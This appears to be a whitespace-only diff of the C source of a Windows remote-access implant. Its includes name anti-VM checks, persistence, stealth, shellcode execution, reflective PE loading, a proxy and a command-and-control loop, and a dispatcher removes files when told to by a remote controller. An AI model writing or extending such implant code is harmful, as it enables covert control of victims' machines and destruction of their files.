@@ -1,12 +1,12 @@
 #define _CRT_SECURE_NO_WARNINGS
 #include <stdio.h>
 #include <windows.h>
-#include <wincrypt.h>    
+#include <wincrypt.h>
 #include "anti.h"        // AntiVM / Persistence /  FileMgr_ all
 #include "user.h"        // Stealth / ExecuteShellcode /  ReflectiveLoadPE / .NET
 #include "proxy.h"       // Proxy_Start / Proxy_Stop
 #include "net.h"         // C2Loop
-#include "config.h"      
+#include "config.h"
 #include "parson.h"      // parser json
 
 #pragma comment(lib, "crypt32.lib")
@@ -91,7 +91,7 @@ void dispatch_command(const uint8_t *buffer, size_t buf_len) {
             }
         }
         else if (strcmp(cmd, "file_del") == 0) {
-            // Del 
+            // Del
             const char *path = json_object_get_string(o, "path");
             if (path) FileMgr_Delete(path);
         }
